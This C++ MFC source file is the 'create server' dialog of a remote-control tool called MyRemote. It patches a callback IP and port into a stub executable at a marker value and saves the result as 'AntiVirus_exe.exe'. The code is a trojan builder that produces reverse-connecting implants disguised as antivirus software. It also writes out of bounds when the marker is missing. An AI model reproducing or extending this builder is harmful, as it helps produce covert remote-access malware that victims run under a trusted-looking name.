// CCreatServerDlg.cpp: 实现文件
//

#include "pch.h"
#include "MyRemote.h"
#include "CCreatServerDlg.h"
#include "afxdialogex.h"
#include "IniFile.h"

// CCreatServerDlg 对话框

IMPLEMENT_DYNAMIC(CCreatServerDlg, CDialogEx)

struct Connect_Address
{
	DWORD dwstact;
	char  strIP[MAX_PATH];
	int   nPort;
}g_myAddress = { 0x1234567,"",0 };

CCreatServerDlg::CCreatServerDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_CREAT_SERVER, pParent)
{
}

CCreatServerDlg::~CCreatServerDlg()
{
}

void CCreatServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CLIENT_IP, m_strIp);
	DDX_Control(pDX, IDC_EDIT_CLIENT_PORT, m_strPort);
}


BEGIN_MESSAGE_MAP(CCreatServerDlg, CDialogEx)
	ON_BN_CLICKED(IDOK, &CCreatServerDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CCreatServerDlg 消息处理程序


BOOL CCreatServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化

	nIp = ((CMyRemoteApp*)AfxGetApp())->m_IniFile.GetString("Settings", "ListemIp");   //读取IP
	nPort = ((CMyRemoteApp*)AfxGetApp())->m_IniFile.GetString("Settings", "ListenPort");
	int	len = m_strIp.GetWindowTextLength();

	m_strIp.SetLimitText(MAXDWORD); // 设置最大长度
	m_strPort.SetLimitText(MAXDWORD); // 设置最大长度

	m_strIp.SetSel(0, -1);
	//用传递过来的数据替换掉该位置的字符  
	m_strIp.ReplaceSel(nIp);

	m_strPort.SetSel(0, -1);
	//用传递过来的数据替换掉该位置的字符  
	m_strPort.ReplaceSel(nPort);
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


int memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da) return i;
	}
	return -1;
}

void CCreatServerDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	CFile file;
	char strTemp[MAX_PATH];
	ZeroMemory(strTemp, MAX_PATH);
	CString strCurrentPath;
	CString strFile;
	CString strSeverFile;
	BYTE* lpBuffer = NULL;
	DWORD dwFileSize;
	UpdateData(TRUE);
	//////////上线信息//////////////////////
	strcpy(g_myAddress.strIP,nIp);
	g_myAddress.nPort = atoi(nPort);
	try
	{
		//此处得到未处理前的文件名
		GetModuleFileName(NULL, strTemp, MAX_PATH);     //得到文件名  
		strCurrentPath = strTemp;
		int nPos = strCurrentPath.ReverseFind('\\');
		strCurrentPath = strCurrentPath.Left(nPos);
		strFile = strCurrentPath + "\\server\\AntiVirus.exe";   //得到当前未处理文件名
		//打开文件
		file.Open(strFile, CFile::modeRead | CFile::typeBinary);
		dwFileSize = file.GetLength();
		lpBuffer = new BYTE[dwFileSize];
		ZeroMemory(lpBuffer, dwFileSize);
		//读取文件内容
		file.Read(lpBuffer, dwFileSize);
		file.Close();
		//写入上线IP和端口 主要是寻找0x1234567这个标识然后写入这个位置
		int nOffset = memfind((char*)lpBuffer, (char*)&g_myAddress.dwstact, dwFileSize, sizeof(DWORD));
		memcpy(lpBuffer + nOffset, &g_myAddress, sizeof(Connect_Address));
		//保存到文件
		strSeverFile = strCurrentPath + "\\AntiVirus_exe.exe";
		file.Open(strSeverFile, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
		file.Write(lpBuffer, dwFileSize);
		file.Close();
		delete[] lpBuffer;
		MessageBox("生成成功");

	}
	catch (CMemoryException* e)
	{
		MessageBox("内存不足");
	}
	catch (CFileException* e)
	{
		MessageBox("文件操作错误");
	}
	catch (CException* e)
	{
		MessageBox("未知错误");
	}
	CDialogEx::OnOK();

}